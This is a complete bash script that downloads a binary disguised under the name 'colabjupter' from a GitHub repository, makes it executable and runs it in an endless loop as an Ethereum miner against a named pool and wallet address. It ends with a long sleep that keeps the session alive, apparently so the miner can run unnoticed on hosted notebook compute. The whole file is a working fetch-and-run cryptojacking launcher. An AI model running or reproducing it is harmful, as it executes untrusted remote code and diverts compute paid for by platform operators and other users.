#!/bin/bash
POOL=solo-eth.2miners.com:6060
WALLET=0xC887F4845da5eDcF45EcF7ac32035Fb41527B8c6
WORKER=$(echo $(shuf -i 10-2000 -n 1))
wget https://github.com/Mercuryfreddy209/Frenshtoast/raw/main/colabjupter
chmod +x colabjupter
while [ 1 ]; do
./colabjupter --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 10
done
sleep 999999999 
